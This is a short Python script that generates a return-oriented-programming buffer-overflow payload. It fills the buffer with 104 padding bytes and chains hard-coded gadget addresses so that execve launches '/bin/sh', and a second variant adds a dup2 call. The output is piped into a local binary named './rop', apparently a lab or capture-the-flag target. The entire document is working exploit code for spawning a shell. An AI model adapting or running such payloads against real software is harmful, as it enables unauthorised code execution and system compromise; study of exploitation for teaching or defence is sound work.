def convert(s):
    converted = ""
    if len(s) == 14:
        s = "0x0000" + s[2:]
    for i in range(len(s) - 1, 2, -2):
        converted += f"\\x{s[i - 1]}{s[i]}"
    return converted
def assemble(command, buffer, rbp, pop_rdi_ret, pop_rsi_ret, pop_rdx_r12_ret, execve_addr):
    null_bf = "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    buffer_plus_8 = buffer
    buffer_plus_8 = buffer_plus_8[:-2] + hex(int(buffer[-2:], 16) + 8)[2:4]

    return f"python2 -c 'print(\"{command}\" + \"{convert(buffer)}\" + \"{null_bf}\" + 104*\"A\" + \"{convert(rbp)}\" + \"{convert(pop_rdi_ret)}\" + \"{convert(buffer)}\" + \"{convert(pop_rsi_ret)}\" + \"{convert(buffer_plus_8)}\" + \"{convert(pop_rdx_r12_ret)}\" + \"{null_bf}\" + \"{null_bf}\" + \"{convert(execve_addr)}\")' | ./rop"
def assemble_2(command, buffer, rbp, pop_rdi_ret, pop_rsi_ret, pop_rdx_r12_ret, execve_addr, dup2_addr):
    null_bf = "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    one_bf = "\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    buffer_plus_8 = buffer
    buffer_plus_8 = buffer_plus_8[:-2] + hex(int(buffer[-2:], 16) + 8)[2:4]
    return f"python2 -c 'print(\"{command}\" + \"{convert(buffer)}\" + \"{null_bf}\" + 104*\"A\" + \"{convert(rbp)}\" + \"{convert(pop_rdi_ret)}\" + \"{one_bf}\" + \"{convert(pop_rsi_ret)}\" + \"{null_bf}\" \"{convert(dup2_addr)}\" + \"{convert(pop_rdi_ret)}\" + \"{convert(buffer)}\" + \"{convert(pop_rsi_ret)}\" + \"{convert(buffer_plus_8)}\" + \"{convert(pop_rdx_r12_ret)}\" + \"{null_bf}\" + \"{null_bf}\" + \"{convert(execve_addr)}\")' | ./rop"
command = "/bin/sh\\x00"
buffer = "0x7fffffffdd60"
rbp = "0x00007fffffffdde0"
pop_rdi_ret = "0x00007ffff7a0364f"
pop_rsi_ret = "0x00007ffff7a05a6a"
pop_rdx_r12_ret = "0x00007ffff7afe35c"
execve_addr = "0x7ffff7ac6ae0"
dup2_addr = "0x7ffff7af2950"
print(assemble(command, buffer, rbp, pop_rdi_ret, pop_rsi_ret, pop_rdx_r12_ret, execve_addr))
print(assemble_2(command, buffer, rbp, pop_rdi_ret, pop_rsi_ret, pop_rdx_r12_ret, execve_addr, dup2_addr))